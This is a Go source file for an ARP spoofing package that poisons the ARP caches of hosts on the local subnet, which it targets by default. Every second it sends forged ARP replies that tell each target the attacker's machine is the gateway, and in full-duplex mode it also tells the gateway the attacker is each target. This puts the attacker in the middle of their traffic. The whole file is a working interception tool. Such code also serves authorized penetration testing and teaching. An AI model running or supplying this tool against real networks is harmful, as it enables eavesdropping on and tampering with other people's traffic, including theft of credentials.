// Package arpspoof
package arpspoof

import (
	"errors"
	"fmt"
	"maps"
	"net"
	"net/netip"
	"os"
	"os/exec"
	"slices"
	"strings"
	"sync"
	"time"

	"github.com/malfunkt/iprange"
	"github.com/mdlayher/packet"
	"github.com/rs/zerolog"
	"github.com/shadowy-pycoder/mshark/layers"
	"github.com/shadowy-pycoder/mshark/network"
	"github.com/shadowy-pycoder/mshark/oui"
)

const (
	protocolARP = 0x0806
	unixEthPAll = 0x03
)

var (
	probeThrottling         = 50 * time.Millisecond
	probeTargetsInterval    = 60 * time.Second
	refreshARPTableInterval = 15 * time.Second
	arpSpoofTargetsInterval = 1 * time.Second
)

type Packet struct {
	addr net.HardwareAddr
	data []byte
}

type ARPSpoofConfig struct {
	Targets    string
	Gateway    *netip.Addr
	Interface  string
	FullDuplex bool
	Logger     *zerolog.Logger
	Debug      bool
}

type ARPTable struct {
	sync.RWMutex
	Ifname  string
	Entries map[string]net.HardwareAddr
}

func (at *ARPTable) String() string {
	var sb strings.Builder

	at.RLock()
	defer at.RUnlock()
	for _, k := range slices.Sorted(maps.Keys(at.Entries)) {
		sb.WriteString(fmt.Sprintf("%s (%s), ", k, oui.VendorWithMAC(at.Entries[k])))
	}
	return strings.TrimRight(sb.String(), ", ")
}

func (at *ARPTable) Get(ip netip.Addr) (net.HardwareAddr, bool) {
	at.RLock()
	defer at.RUnlock()
	hw, ok := at.Entries[ip.String()]
	return hw, ok
}

func (at *ARPTable) Set(ip netip.Addr, hw net.HardwareAddr) {
	at.Lock()
	at.Entries[ip.String()] = hw
	at.Unlock()
}

func (at *ARPTable) Delete(ip netip.Addr) {
	at.Lock()
	delete(at.Entries, ip.String())
	at.Unlock()
}

func (at *ARPTable) Refresh() error {
	at.Lock()
	defer at.Unlock()
	cmd := exec.Command("sh", "-c", "ip -br neigh")
	out, err := cmd.Output()
	if err != nil {
		return err
	}
	clear(at.Entries)
	for line := range strings.Lines(string(out)) {
		fields := strings.Fields(line)
		if len(fields) < 3 {
			continue
		}
		if fields[1] != at.Ifname {
			continue
		}
		ip, err := netip.ParseAddr(fields[0])
		if err != nil {
			return err
		}
		hw, err := net.ParseMAC(fields[2])
		if err != nil {
			return err
		}
		at.Entries[ip.String()] = hw
	}
	return nil
}

type ARPSpoofer struct {
	targets    []netip.Addr
	gwIP       netip.Addr
	gwMAC      net.HardwareAddr
	iface      *net.Interface
	hostIP     netip.Addr
	hostMAC    net.HardwareAddr
	fullduplex bool
	arpTable   *ARPTable
	packets    chan *Packet
	logger     *zerolog.Logger
	quit       chan bool
	wg         sync.WaitGroup
	p          *packet.Conn
}

func NewARPSpoofer(conf *ARPSpoofConfig) (*ARPSpoofer, error) {
	arpspoofer := &ARPSpoofer{}
	// determining interface
	iface, err := network.GetDefaultInterface()
	if err != nil {
		return nil, err
	}
	if conf.Interface != "" {
		arpspoofer.iface, err = net.InterfaceByName(conf.Interface)
		if err != nil {
			return nil, err
		}
	} else {
		arpspoofer.iface = iface
	}
	prefix, err := network.GetIPv4PrefixFromInterface(arpspoofer.iface)
	if err != nil {
		return nil, err
	}
	arpspoofer.hostIP = prefix.Addr()
	arpspoofer.hostMAC = arpspoofer.iface.HardwareAddr
	arpspoofer.arpTable = &ARPTable{Ifname: arpspoofer.iface.Name, Entries: make(map[string]net.HardwareAddr)}
	err = arpspoofer.arpTable.Refresh()
	if err != nil {
		return nil, err
	}
	if conf.Gateway != nil && conf.Gateway.IsValid() && conf.Gateway.Is4() {
		// TODO: find out why custom gateway may be useful
		arpspoofer.gwIP = *conf.Gateway
	} else {
		var gwIP netip.Addr
		if arpspoofer.iface.Name != iface.Name {
			gwIP, err = network.GetGatewayIPv4FromInterface(arpspoofer.iface.Name)
			if err != nil {
				return nil, fmt.Errorf("failed fetching gateway ip: %w", err)
			}
		} else {
			gwIP, err = network.GetDefaultGatewayIPv4()
			if err != nil {
				return nil, fmt.Errorf("failed fetching gateway ip: %w", err)
			}
		}
		arpspoofer.gwIP = gwIP
	}
	if gwMAC, ok := arpspoofer.arpTable.Get(arpspoofer.gwIP); !ok {
		probeIP(arpspoofer.gwIP)
		time.Sleep(probeThrottling)
		err = arpspoofer.arpTable.Refresh()
		if err != nil {
			return nil, err
		}
		if gwMAC, ok := arpspoofer.arpTable.Get(arpspoofer.gwIP); !ok {
			return nil, fmt.Errorf("failed fetching gateway MAC")
		} else {
			arpspoofer.gwMAC = gwMAC
		}
	} else {
		arpspoofer.gwMAC = gwMAC
	}
	// parsing targets list
	if conf.Targets == "" {
		// defaults to subnet
		conf.Targets = prefix.String()
	}
	list, err := iprange.ParseList(conf.Targets)
	if err != nil {
		return nil, err
	}
	normalizedList := list.Expand()
	targets := make([]netip.Addr, 0, len(normalizedList))
	for _, ipb := range normalizedList {
		ip, ok := netip.AddrFromSlice(ipb)
		if !ok {
			return nil, fmt.Errorf("failed parsing list of targets")
		}
		// remove invalid addresses (sanity check)
		if !ip.IsValid() || !ip.Is4() {
			continue
		}
		// remove addresses that do not belong to subnet
		if !prefix.Contains(ip) {
			continue
		}
		// remove host from targets
		if ip.Compare(arpspoofer.hostIP) == 0 {
			continue
		}
		// remove gateway from targets
		if ip.Compare(arpspoofer.gwIP) == 0 {
			continue
		}
		// remove broadcast ip from targets
		if strings.HasSuffix(ip.String(), ".255") {
			continue
		}
		targets = append(targets, ip)
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("list of targets is empty")
	}
	arpspoofer.targets = targets
	arpspoofer.fullduplex = conf.FullDuplex
	arpspoofer.packets = make(chan *Packet)
	arpspoofer.quit = make(chan bool)
	arpspoofer.p, err = packet.Listen(arpspoofer.iface, packet.Raw, unixEthPAll, nil)
	if err != nil {
		if errors.Is(err, os.ErrPermission) {
			return nil, fmt.Errorf("permission denied (try setting CAP_NET_RAW capability): %v", err)
		}
		return nil, fmt.Errorf("failed to listen: %v", err)
	}
	// setting up logger
	zerolog.SetGlobalLevel(zerolog.InfoLevel)
	if conf.Debug {
		zerolog.SetGlobalLevel(zerolog.DebugLevel)
	}
	if conf.Logger != nil {
		arpspoofer.logger = conf.Logger
	} else {
		logger := zerolog.New(os.Stdout).With().Timestamp().Logger()
		arpspoofer.logger = &logger
	}
	return arpspoofer, nil
}

func (ar *ARPSpoofer) Start() {
	ar.logger.Info().Msg("[arp spoofer] Started")
	go ar.handlePackets()
	ar.logger.Debug().Msgf("[arp spoofer] Probing %d targets", len(ar.targets))
	ar.probeTargetsOnce()
	ar.logger.Debug().Msg("[arp spoofer] Refreshing ARP table")
	ar.arpTable.Refresh()
	ar.logger.Info().Msgf("[arp spoofer] Detected targets: %s", ar.arpTable)
	go ar.probeTargets()
	go ar.refreshARPTable()
	ar.wg.Add(1)
	for {
		select {
		case <-ar.quit:
			ar.wg.Done()
			return
		default:
			ar.spoofTargets()
			time.Sleep(arpSpoofTargetsInterval)
		}
	}
}

func (ar *ARPSpoofer) Stop() error {
	var err error
	ar.logger.Info().Msg("[arp spoofer] Stopping...")
	close(ar.quit)
	ar.wg.Wait()
	err = ar.unspoofTargets()
	close(ar.packets)
	ar.logger.Info().Msg("[arp spoofer] Stopped")
	return err
}

func doProbe(ip netip.Addr) error {
	// TODO: add manual packet crafting
	ping := exec.Command("sh", "-c", fmt.Sprintf("ping -c1 -t1 -w1 %s", ip))
	if err := ping.Start(); err != nil {
		return err
	}
	if err := ping.Wait(); err != nil {
		return err
	}
	return nil
}

func probeIP(ip netip.Addr) error {
	return doProbe(ip)
}

func (ar *ARPSpoofer) probeTargetsOnce() {
	var wg sync.WaitGroup
	for _, ip := range ar.targets {
		wg.Add(1)
		go func(ip netip.Addr) {
			defer wg.Done()
			doProbe(ip)
		}(ip)
		time.Sleep(probeThrottling)
	}
	wg.Wait()
}

func (ar *ARPSpoofer) probeTargets() {
	ar.wg.Add(1)
	t := time.NewTicker(probeTargetsInterval)
	var wg sync.WaitGroup
	for {
		select {
		case <-ar.quit:
			ar.wg.Done()
			return
		case <-t.C:
			ar.logger.Debug().Msgf("[arp spoofer] Probing %d targets", len(ar.targets))
			for _, ip := range ar.targets {
				wg.Add(1)
				go func(ip netip.Addr) {
					defer wg.Done()
					doProbe(ip)
				}(ip)
				time.Sleep(probeThrottling)
			}
			wg.Wait()
		}
	}
}

func (ar *ARPSpoofer) refreshARPTable() {
	ar.wg.Add(1)
	t := time.NewTicker(refreshARPTableInterval)
	for {
		select {
		case <-ar.quit:
			ar.wg.Done()
			return
		case <-t.C:
			ar.logger.Debug().Msg("[arp spoofer] Refreshing ARP table")
			ar.arpTable.Refresh()
			ar.logger.Info().Msgf("[arp spoofer] Detected targets: %s", ar.arpTable)
		}
	}
}

func (ar *ARPSpoofer) writePacket(p *Packet) (int, error) {
	return ar.p.WriteTo(p.data, &packet.Addr{HardwareAddr: p.addr})
}

func (ar *ARPSpoofer) handlePackets() {
	for p := range ar.packets {
		_, err := ar.writePacket(p)
		if err != nil {
			ar.logger.Debug().Msg(err.Error())
		}
	}
}

func (ar *ARPSpoofer) newARPReply(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP netip.Addr) (*Packet, error) {
	arp, err := layers.NewARPPacket(layers.OperationReply, srcMAC, srcIP, dstMAC, dstIP)
	if err != nil {
		ar.logger.Debug().Msg(err.Error())
		return nil, err
	}
	eth, err := layers.NewEthernetFrame(dstMAC, srcMAC, layers.EtherTypeARP, arp.ToBytes())
	if err != nil {
		ar.logger.Debug().Msg(err.Error())
		return nil, err
	}
	return &Packet{addr: dstMAC, data: eth.ToBytes()}, nil
}

func (ar *ARPSpoofer) spoofTargets() {
	for _, targetIP := range ar.targets {
		if targetMAC, ok := ar.arpTable.Get(targetIP); !ok {
			continue
		} else {
			ap, err := ar.newARPReply(ar.hostMAC, targetMAC, ar.gwIP, targetIP)
			if err != nil {
				continue
			}
			ar.logger.Debug().Msgf("[arp spoofer] Sending %d bytes of ARP packet to %s (%s)", len(ap.data), targetIP, oui.VendorWithMAC(targetMAC))
			ar.packets <- ap
		}
		if ar.fullduplex {
			ap, err := ar.newARPReply(ar.hostMAC, ar.gwMAC, targetIP, ar.gwIP)
			if err != nil {
				continue
			}
			ar.logger.Debug().Msgf("[arp spoofer] Telling %s (%s) we are %s", ar.gwIP, oui.VendorWithMAC(ar.gwMAC), targetIP)
			ar.packets <- ap
		}
	}
}

func (ar *ARPSpoofer) unspoofTargets() error {
	ar.logger.Info().Msgf("[arp spoofer] Restoring ARP cache of %d targets", len(ar.targets))
	for _, targetIP := range ar.targets {
		if targetMAC, ok := ar.arpTable.Get(targetIP); !ok {
			continue
		} else {
			ar.logger.Debug().Msgf("[arp spoofer] Restoring ARP cache of %s (%s)", targetIP, oui.VendorWithMAC(targetMAC))
			ap, err := ar.newARPReply(targetMAC, ar.gwMAC, targetIP, ar.gwIP)
			if err != nil {
				return err
			}
			ar.packets <- ap
		}
	}
	return nil
}
